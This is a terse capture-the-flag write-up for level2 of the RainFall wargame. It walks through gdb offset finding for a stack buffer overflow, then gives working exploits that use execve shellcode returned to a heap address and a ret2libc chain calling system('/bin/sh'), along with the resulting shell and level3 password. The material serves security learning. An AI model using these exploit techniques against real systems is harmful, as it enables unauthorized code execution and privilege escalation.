


first step checking if the binary vulnerable or not
```
python -c 'print "A" * 100' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
find where exactly does it crash

```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Segmentation fault. 
0x61616175
```
```
unhex 61616175 | rev ; echo ""
uaaa
```
```
cyclic -l uaaa
80
```
manually calculating the distance between the buffer start address and the EIP
```
brek at  0x080484f2 <+30>:    mov    0x4(%ebp),%eax

 run <<< "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
info frame

eip at 0xbffff71c

(gdb) x/40wx $esp

0xbffff6b0:     0xbffff6cc      0x00000000      0x00000000      0xb7e5ec73

0xbffff6c0:     0x080482b5      0x00000000      0x00ca0000      0x41414141

(gdb) p/x 0xbffff6c0 + 12

$1 = 0xbffff6cc

(gdb) x 0xbffff6cc

0xbffff6cc:     0x41414141

(gdb) p/d 0xbffff71c - 0xbffff6cc. (also p/d $ebp+4 - (0xbffff6a0+12) )

$3 = 80
```
```
shellcraft i386.linux.sh

6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80

python3 -c 'import struct; print(struct.pack(">L", 0x44840408))'
```

other method:
```
r <<< "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU"

 SIGSEGV  0x55555555
 
 (gdb) p/c 0x55555555 = U

echo  "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" | wc

81 - 1 = 80
```

===
```
define hook-stop
echo "---------------------------- esp -------------"
x/40wx $esp
echo "---------------------------- eip instructions -------------"
x/2i $eip
end
```

there is no system() therefore no shell to jump to

===

```
python3 -c 'print (len("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"))'

21

80 - 21 = 59
```

```
level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2

pwd
/home/user/level2

whoami
level3

cat /home/user/level3/.pass

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

how to get the heap addr : \x08\x04\xa0\x08

https://tc.gts3.org/cs6265/2019/tut/tut09-01-heap.html

 ltrace ./level2
 
 "pass a str" = = 0x0804a008 
 
 other method:
 
 smash the buffer to sigv by passin "a"s
 
 (gdb) info proc mappings
 
 heap addrs strat from  0x804a000 to 0x806b000
 
 examin 8 addr
``` 
 (gdb) x/8wx 0x804a000
 
0x804a000:      0x00000000      0x00000069      0x61616161      0x61616161

0x804a010:      0x61616161      0x61616161      0x61616161      0x61616161
```
first apperance of 'a' = 

`(gdb) p/x 0x804a000 + 8 = 0x804a008`
 
 =====
 
 ret2libc
 
 ```
 ret of p() func  0x0804853e to bypass check
 
 (gdb) p system ==> 0xb7e6b060
 
 (gdb) find system, +9999999, "/bin/sh" ==> 0xb7f8cc58
 
 system() needs a return value
 
 level2@RainFall:~$ python -c 'print "A" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1] ' > /tmp/payload
 
 (cat /tmp/payload ; cat) | ./level2
 
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```

